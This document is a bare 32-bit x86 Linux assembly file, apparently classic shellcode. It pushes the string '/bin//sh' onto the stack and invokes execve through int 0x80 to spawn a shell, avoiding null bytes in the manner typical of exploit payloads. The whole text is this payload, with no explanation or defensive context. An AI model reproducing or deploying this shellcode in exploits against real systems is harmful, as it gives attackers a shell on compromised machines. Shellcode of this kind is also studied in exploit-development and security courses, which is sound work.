section .text
global _start
_start:
	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	push eax
	push ebx
	mov ecx,esp
	lea eax,[eax+11]
	int 0x80
